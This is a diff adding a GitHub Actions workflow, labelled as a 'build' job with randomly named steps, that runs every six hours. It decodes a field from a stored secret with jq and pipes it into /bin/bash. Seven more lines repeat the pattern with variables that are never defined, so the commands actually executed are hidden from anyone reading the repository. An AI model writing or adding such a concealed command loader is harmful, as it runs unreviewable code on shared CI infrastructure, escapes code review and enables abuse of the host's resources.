@@ -1,0 +1,24 @@
+name: liangjiajiang9129
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangjiajiang9129
+        env:
+          th5: ${{ secrets.th5 }}
+        run: |
+          echo $th5 | jq -r .bx46042 | /bin/bash
+          echo $nqcje18918 | jq -r .nzcys9 | /bin/bash
+          echo $wm26850 | jq -r .wm24 | /bin/bash
+          echo $tuq4780 | jq -r .wzoiu9 | /bin/bash
+          echo $kf5165 | jq -r .fngcc9275 | /bin/bash
+          echo $g8 | jq -r .nlkuf8486 | /bin/bash
+          echo $qgfv43 | jq -r .cs23 | /bin/bash
+          echo $axq62545 | jq -r .im4 | /bin/bash
+
